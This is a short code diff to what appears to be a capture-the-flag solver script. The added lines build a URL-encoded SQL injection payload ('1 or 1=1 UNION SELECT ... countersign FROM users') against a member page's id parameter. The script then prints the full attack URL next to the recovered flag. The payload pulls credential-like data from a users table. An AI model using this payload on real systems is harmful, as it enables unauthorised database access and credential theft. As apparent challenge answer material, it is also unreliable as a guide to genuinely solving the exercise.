@@ -48,7 +48,8 @@ if __name__ == '__main__':
 
         if check_host_name(host_name):
             crypt = get_crypt(host_name)
-            print(get_flag(crypt))
+            inject = '1+or+1%3D1+UNION+SELECT+Commentaire%2C+countersign+FROM+users&Submit=Submit'
+            print(f"09 : {get_flag(crypt)} - SQL injection members http://{host_name}/?page=member&id={inject}")
         else:
             raise Exception('Incorrect host name')
     except Exception as e:
